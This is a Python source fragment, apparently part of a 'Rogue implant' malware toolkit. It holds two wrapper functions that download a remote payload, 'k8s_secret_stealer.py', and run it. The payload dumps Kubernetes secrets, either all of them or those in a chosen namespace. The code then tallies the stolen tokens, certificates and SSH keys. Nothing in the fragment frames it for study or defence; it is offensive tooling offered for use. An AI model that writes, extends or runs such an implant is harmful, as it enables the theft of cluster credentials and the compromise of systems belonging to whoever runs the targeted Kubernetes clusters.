def trigger_k8s_steal():
    """Wrapper function for Rogue implant integration"""
    print("[+] Starting Kubernetes secret stealer...")
    
    # Download the payload if not present
    payload_path = fetch_payload("k8s_secret_stealer.py")
    if not payload_path:
        return "[!] Failed to download k8s_secret_stealer.py"
    
    # Run the payload
    try:
        result = subprocess.run(
            ["python3", payload_path, "--dump-all"],
            capture_output=True,
            text=True,
            timeout=300  # 5 minutes timeout
        )
        
        if result.returncode == 0:
            output = result.stdout
            
            # Extract output directory from results
            import re
            dir_match = re.search(r"Output directory: (.*?)\n", output)
            if dir_match:
                output_dir = dir_match.group(1)
                
                # Create summary
                summary = f"[+] Kubernetes secret stealing completed\n"
                summary += f"[+] Output directory: {output_dir}\n"
                
                # Count files
                import os
                file_count = 0
                for root, dirs, files in os.walk(output_dir):
                    file_count += len(files)
                
                summary += f"[+] Total files extracted: {file_count}\n"
                
                # Look for interesting files
                interesting_paths = [
                    os.path.join(output_dir, "tokens"),
                    os.path.join(output_dir, "certificates"),
                    os.path.join(output_dir, "ssh_keys"),
                ]
                
                for path in interesting_paths:
                    if os.path.exists(path):
                        count = len(os.listdir(path))
                        summary += f"[+] Found {count} items in {os.path.basename(path)}\n"
                
                return summary + "\n" + output[-1000:]  # Last 1000 chars of output
            else:
                return output[-2000:]  # Last 2000 chars if can't parse
        
        else:
            return f"[!] Kubernetes secret stealer failed:\n{result.stderr}"
    
    except subprocess.TimeoutExpired:
        return "[!] Kubernetes secret stealer timed out (5 minutes)"
    except Exception as e:
        return f"[!] Error running Kubernetes secret stealer: {e}"

def trigger_k8s_targeted(namespace=None, secret=None):
    """Targeted Kubernetes secret stealing"""
    if not namespace:
        return "[!] Usage: trigger_k8s_targeted <namespace> [secret_name]"
    
    print(f"[+] Starting targeted Kubernetes secret stealer for namespace: {namespace}")
    
    payload_path = fetch_payload("k8s_secret_stealer.py")
    if not payload_path:
        return "[!] Failed to download k8s_secret_stealer.py"
    
    try:
        cmd = ["python3", payload_path, "--target-namespace", namespace]
        if secret:
            cmd.extend(["--target-secret", secret])
        
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120  # 2 minutes timeout
        )
        
        if result.returncode == 0:
            return f"[+] Targeted Kubernetes secret stealing completed\n{result.stdout[-1000:]}"
        else:
            return f"[!] Targeted stealing failed:\n{result.stderr}"
    
    except Exception as e:
        return f"[!] Error: {e}"
